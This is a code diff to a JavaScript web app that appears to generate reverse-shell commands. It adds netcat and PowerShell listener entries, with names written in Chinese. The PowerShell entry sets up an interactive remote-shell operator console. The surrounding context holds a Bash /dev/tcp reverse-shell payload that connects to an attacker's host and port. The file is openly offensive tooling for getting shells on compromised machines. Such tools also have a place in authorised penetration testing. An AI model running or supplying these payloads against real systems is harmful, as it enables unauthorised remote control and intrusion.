@@ -9,6 +9,21 @@ createApp({
             isDark: true,
             payloads: [
                 {
+
+                  name: 'nc 监听',
+                  commands:[
+                    { raw: `nc -lvnp {{LPORT}}` },
+                  ]
+                },
+                {
+                  name: 'PowerShell 监听',
+                  commands:[
+                    { raw: `powershell $port={{LPORT}};$l=[System.Net.Sockets.TcpListener]::new($port);$l.Start();Write-Host "Listening on port $port...";$c=$l.AcceptTcpClient();Write-Host "Connection received!";$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$true;while($c.Connected){$i=Read-Host "Shell";$w.WriteLine($i);Start-Sleep -Milliseconds 100;while(!$s.DataAvailable){Start-Sleep -Milliseconds 50};while($s.DataAvailable){$o=$r.ReadLine();if($o -ne $null){Write-Host $o}}}
+` },
+                  ]
+                },
+                
+                {
                   name: 'Bash TCP',
                   commands: [
                     { raw: `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1` },
